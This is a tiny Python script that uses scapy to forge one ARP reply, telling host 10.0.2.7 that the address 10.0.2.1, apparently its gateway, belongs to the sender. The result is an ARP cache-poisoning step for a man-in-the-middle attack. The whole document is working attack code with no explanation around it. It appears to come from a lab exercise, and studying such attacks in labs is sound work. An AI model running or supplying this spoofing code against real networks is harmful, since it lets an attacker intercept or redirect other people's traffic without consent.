#!/usr/bin/env python

import scapy.all as scapy

packet = scapy.ARP(op=2, pdst="10.0.2.7", hwdst="ff:ff:ff:ff:ff:ff", psrc="10.0.2.1")
scapy.send(packet)
